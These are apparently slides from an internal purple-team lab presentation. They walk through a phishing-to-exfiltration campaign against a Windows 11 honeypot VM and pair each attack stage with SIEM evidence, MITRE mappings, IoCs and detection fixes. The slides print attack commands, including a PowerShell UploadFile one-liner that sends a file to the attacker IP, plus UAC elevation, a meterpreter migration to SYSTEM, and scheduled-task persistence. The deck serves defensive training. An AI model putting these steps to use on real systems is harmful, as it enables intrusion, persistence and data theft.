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 Team: Full Kill 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CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Purple-Team Campaign Lab — Phish to Exfiltration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr>
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Target: HONEYPOT (Windows 11 24H2 VM)  |  Controlled Lab  |  Oct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CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Purple-Team Campaign Lab — internal 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F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One PDF click → full compromise → stolen file, in 6 stages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every stage left a log in the Elastic SIEM — this deck pairs each red-team step with the real evidence the blue team sees</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Chevron 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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1  PHISH</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Chevron 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EF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2  EXECUTE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Chevron 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3794760" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F59E0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3  C2</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Chevron 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAB3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11827"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4  ESCALATE</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Chevron 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7178040" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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5  PERSIST</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Chevron 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8869680" y="2834640"/>
            <a:ext cx="1874519" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="chevron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6  EXFIL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Kill Chain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F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One attacker IP does three jobs — 8080 serve, 4443 command, 4444 data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Beacon = reverse TCP: the victim always initiates the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96012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8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Phish PDF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Year-End Showcase</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>Invitation (RSVP link)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920240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3B12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CA5A5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Victim VM HONEYPOT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>192.168.254.128</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>user: honey (local admin)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1600200"/>
            <a:ext cx="868680" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow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click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325880"/>
            <a:ext cx="2331720" cy="150876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7DD3FC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ATTACKER HOST</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>192.168.254.100 (VMnet8)</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>:8080  HTTP payload server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>:4443  C2 relay (Python)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>:4444  exfil listener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1783080"/>
            <a:ext cx="868680" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rightArrow">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0EA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325880"/>
            <a:ext cx="3931920" cy="150876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A7F3D0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KALI LINUX (WSL2, mirrored)</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>msfvenom  →  office_update.exe (256,000 B, PE32+)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>msfconsole exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>LHOST 127.0.0.1  LPORT 4445</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:t>http.server :8090 (serves /tmp)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0561320" cy="1051560"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1720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CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Why the relay?  WSL2 mirrored networking cannot receive inbound connections on the host's VMware IP — so a native-Windows Python bridge (c2_relay.py) sits in the path: beacon :4443 → relay → msfconsole 127.0.0.1:4445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Infrastructure &amp; Tooling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600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Lure: work-looking invitation PDF, one RSVP hyperlink</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Link = http://192.168.254.100:8080/office_update.exe (256,000 B)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SIEM proof (endpoint.events.network):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03:59:11Z  msedge.exe → 192.168.254.100:8080  (honey)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>05:03:16Z  office_update.exe launched by explorer.exe (honey, medium)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE: T1566.001 Spearphishing  ·  T1204.002 User Execution</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="slide_assets_ph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166733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Stage 1 — Initial Access: The Phish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2200" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The victim makes the call</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Beacon dials OUT to 192.168.254.100:4443 — looks like normal outbound web traffic, so egress-agnostic firewalls allow it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every command (shell, files, exec) rides this one TCP socket to Kali msfconsole</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SIEM proof — repeated C2 beacons (endpoint.events.network):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>05:03:16Z · 05:09:16Z · 05:13:15Z · 05:19:24Z · 05:21:24Z</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>office_update.exe → 192.168.254.100:4443  (honey)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE: T1095 Non-Standard Port</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="img_msf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554480"/>
            <a:ext cx="6309360" cy="3623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Stage 2 — C2: The Secret Phone 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600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Problem: beacon runs as honey at MEDIUM integrity — cannot write HKLM or open SYSTEM processes (UAC filtered-admin)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 1 — UAC consent elevation (victim clicks Yes):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>powershell -nop -c "Start-Process C:\Users\honey\Downloads\office_update.exe -Verb RunAs"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SIEM proof: 05:21:16Z powershell pid 26652 (medium, parent cmd) → 05:21:23Z office_update.exe pid 2268  integrity: HIGH (parent powershell pid 26652)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 2 — process migration into a pre-existing SYSTEM service host:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>meterpreter: migrate 16352  →  getuid = NT AUTHORITY\SYSTEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Mechanism: OpenProcess (unlocked by SeDebugPrivilege) → VirtualAllocEx + WriteProcessMemory → CreateRemoteThread</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE: T1548.002 Bypass UAC  ·  T1134 Access Token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Stage 3 — Privilege Escalation to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F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>services.exe (PID 736)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>└─ svchost.exe (PID 16352, SYSTEM)  ← pre-existing, the migration TARGET</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>explorer.exe (PID 3368)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FCA5A5"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>└─ office_update.exe (PID 22584, honey, MEDIUM)  ← original beacon, launched from Downloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe (PID 21892 — the meterpreter shell)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="FCD34D"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>└─ powershell.exe (PID 26652, medium)  ← "Start-Process -Verb RunAs"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    └─ office_update.exe (PID 2268, HIGH integrity)  ← elevated beacon → MIGRATES into svchost 16352</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cmd.exe (PID 10264 — SYSTEM shell after migration)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>└─ powershell.exe (PID 5984, SYSTEM)  ← the exfil one-liner (05:32:16Z)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Beacon SHA256 (all copies, from SIEM): 77428ca3890441ae79f9b8532996320b9304100b9f1b8a06bc91bd130a1af774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The Process Tree (real SIEM process events)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500">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Beacon staged: C:\ProgramData\WinUpdate\wu_service.exe (256,000 B, disguised name)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trigger 1 — boot (no logon needed):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>schtasks WinUpdateSvc /sc onstart /ru SYSTEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Trigger 2 — any user logon (redundancy):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HKLM\...\CurrentVersion\Run  →  WinUpdateSvc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE: T1053.005 Scheduled Task  ·  T1547.001 Registry Run Key</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="img_pers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6583680" cy="340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Stage 4 — Persistence (planted as SYSTEM)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F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This is the smoking gun of any compromise report:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"beacon reconnected on its own after reboot"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If a defender removes one trigger, the other re-establishes C2 — that redundancy is deliberate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601200" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1720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4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>VM rebooted UNATTENDED  →  at boot, scheduled task WinUpdateSvc fired wu_service.exe as SYSTEM  →  meterpreter session opened automatically with ZERO user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Persistence — Proven: It Survived a Reboot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500">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Target: C:\Users\honey\OneDrive\Documents\secret.txt (2,524 B)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300" i="1">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Gotcha: Win11 redirects Documents into OneDrive — the 'real' path was empty</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The one-liner (from SYSTEM shell):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1250">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>(New-Object Net.WebClient).UploadFile('http://192.168.254.100:4444', ...)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Recovered intact on attacker infra — content verified</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MITRE: T1041 Exfiltration Over C2 Channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="img_ex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583680" cy="30834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Stage 5 — Exfiltration: The File Is Gone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500">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Red row = the theft: powershell.exe as SYSTEM → 192.168.254.100:4444, 05:32:17Z, connection_attempted from 192.168.254.128:55782</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Data channel (4444) is separate from C2 (4443) — a rule tuned to the C2 port alone misses it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="img_siem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698480" cy="4942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Exfil — Proven From the SIEM (real events)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Purple-Team Campaign Lab — internal technical presentation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47040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 evidence (this engagement)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Initial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Phishing: Spearphishing Attachment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T1566.001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msedge.exe → 192.168.254.100:8080 at 03:59:11Z (RSVP link)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Execution: Malicious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T1204.002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office_update.exe (sha 77428ca3…af774) parent explorer.exe, 05:03:16Z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Non-Standard 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beacon → :4443, 05:03:16Z → 05:21:24Z, repeated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Priv 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Abuse Elevation Control: Bypass UAC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T1548.002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Start-Process -Verb RunAs → integrity high (pid 2268), 05:21:23Z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Priv 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 Token Manipulation (migration)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migrated into svchost pid 16352 → NT AUTHORITY\SYSTEM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Scheduled Task/Job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T1053.005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task WinUpdateSvc, /sc onstart /ru SYSTEM — fired at boot unattended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Boot or Logon Autostart: Registry Run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T1547.001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HKLM Run value WinUpdateSvc → C:\ProgramData\WinUpdate\wu_service.exe</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr/>
                </a:tc>
              </a:tr>
              <a:tr h="447040">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:t>Exfiltration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Exfiltration Over C2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WebClient.UploadFile → :4444 at 05:32:17Z as SYSTEM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MITRE ATT&amp;CK Mapping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700" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IoCs from this engagement (all verified in SIEM):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>IP 192.168.254.100  ·  ports 8080 (serve) / 4443 (C2) / 4444 (data)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Beacon SHA256  77428ca3890441ae79f9b8532996320b9304100b9f1b8a06bc91bd130a1af774</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="7DD3FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>C:\ProgramData\WinUpdate\wu_service.exe  ·  task WinUpdateSvc  ·  HKLM Run value WinUpdateSvc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="FBBF24"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The honest truth: nothing was hidden — the SIEM logged the full command line, SYSTEM user, and outbound connection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1400">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>It didn't alert because no single element looks bad alone (powershell = common, SYSTEM = common, outbound HTTP = common)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The fix = correlate: signed-system-tool + suspicious command line (Net.WebClient UploadFile) + outbound to non-whitelisted IP = alert</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Contain: block egress to 192.168.254.100 on 8080/4443/4444  ·  Eradicate: del task + Run value + C:\ProgramData\WinUpdate  ·  Hunt: same IP estate-wide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IoCs &amp; The Detection Gap (what the SOC should do)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rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>One attacker IP, three jobs (8080 / 4443 / 4444) — a forensic fingerprint that ties the whole chain together</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>UAC is the wall: a medium-integrity admin can't touch HKLM — one 'Yes' click changed everything (and is exactly where social engineering wins)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Persistence is the proof: the unattended-reboot auto-session is the moment a compromise becomes a confirmed intrusion</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows 11 gotcha: Documents → OneDrive redirection (affects both attacker file-hunting and defender evidence-hunting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr/>
            <a:r>
              <a:rPr sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="4ADE80"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exfil with a signed system tool on a separate port = detectable by design; the defender's job is correlation, not more raw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Calibri"/>
              </a:rPr>
              <a:t>Lessons Learned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